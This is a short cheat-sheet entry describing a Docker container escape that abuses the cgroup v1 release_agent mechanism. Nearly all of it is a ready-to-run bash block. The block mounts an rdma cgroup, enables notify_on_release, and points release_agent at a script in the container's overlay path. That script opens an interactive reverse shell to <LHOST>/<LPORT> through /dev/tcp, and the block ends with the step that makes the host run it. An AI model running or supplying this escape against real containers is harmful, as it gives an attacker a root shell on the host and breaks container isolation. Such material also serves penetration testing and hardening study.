# Docker Escape via cgroup release_agent

If the container can mount the `rdma` (or another) cgroup controller, abuse `release_agent` to get the host to execute a script when a cgroup empties out.

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)   # container's path as seen from the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/bash' > /cmd
echo "/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"   # trigger: emptying the cgroup fires release_agent as the host
```
